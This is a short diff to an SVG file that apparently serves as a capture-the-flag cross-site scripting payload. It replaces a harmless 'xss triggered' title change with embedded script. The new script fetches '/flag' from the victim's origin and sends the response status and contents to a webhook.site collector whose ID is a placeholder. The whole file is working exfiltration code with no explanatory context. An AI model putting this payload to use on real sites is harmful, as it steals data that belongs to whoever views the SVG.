@@ -1,5 +1,14 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    document.title = "xss triggered";
+    fetch('https://webhook.site/YOUR-ID?step=loaded');
+
+    fetch('/flag')
+      .then(r => {
+        fetch('https://webhook.site/YOUR-ID?step=flag-status-' + r.status);
+        return r.text();
+      })
+      .then(f => {
+        fetch('https://webhook.site/YOUR-ID?flag=' + encodeURIComponent(f));
+      });
   </script>
 </svg>
